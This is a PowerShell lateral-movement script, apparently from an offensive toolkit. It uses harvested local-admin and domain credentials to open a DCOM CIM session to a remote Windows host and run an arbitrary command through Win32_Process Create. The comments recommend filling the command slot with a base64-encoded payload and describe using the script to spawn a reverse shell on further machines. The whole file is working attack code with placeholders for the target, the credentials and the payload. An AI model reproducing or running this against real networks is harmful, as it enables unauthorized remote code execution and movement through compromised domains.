#Requirements:

#  - Credentials from a user in the Local Administrator and Domain User groups on target machine.

#It uses the New-Cimsession powershell's cmdlet in the $session var in order to spawn a new process in a remote target within an AD network.



#Creds store part.
$username = '<TARGETUSERNAME>';
$password = '<TARGETPASSWORD>';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;

#Command Object part.
$options = New-CimSessionOption -Protocol DCOM
$session = New-Cimsession -ComputerName <TARGETIP> -Credential $credential -SessionOption $Options 
$command = '<PAYLOAD>'; #It is desiderable to save in this variable a command with a base64 encoded payload.

#Invoking Create method.
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

#In theory, we could use this script to move along to a remote 'node' and spawn a reverse shell as TARGETUSERNAME hich will be pass to the script encoded with the 'encoder.py' script.
